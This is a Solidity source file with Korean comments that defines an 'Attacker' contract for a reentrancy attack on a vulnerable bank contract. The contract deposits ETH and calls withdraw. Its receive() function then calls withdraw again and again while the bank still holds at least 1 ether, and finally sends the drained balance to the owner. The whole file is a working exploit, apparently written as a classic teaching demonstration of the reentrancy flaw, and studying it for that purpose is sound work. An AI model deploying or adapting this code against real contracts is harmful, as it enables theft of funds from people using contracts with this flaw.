// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice 취약한 은행 컨트랙트 인터페이스 정의
interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker - 재진입 공격을 수행하는 컨트랙트
contract Attacker {
    IVulnerableBank public bank;
    address public owner;
    bool public attackInProgress;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    /// @notice 공격 시작 함수. ETH를 입금하고 바로 출금 시도
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Send ETH to attack");

        // 공격 대상 은행에 입금
        bank.deposit{value: msg.value}();

        // 공격 진행 플래그 설정
        attackInProgress = true;

        // 최초 출금 → 이후 receive() 통해 재귀 호출
        bank.withdraw();
    }

    /// @notice 재진입 공격 핵심 로직
    receive() external payable {
        if (attackInProgress && address(bank).balance >= 1 ether) {
            bank.withdraw();  // 재귀적으로 withdraw() 다시 호출
        } else {
            attackInProgress = false;
        }
    }

    /// @notice 공격 후 컨트랙트 잔액 회수
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}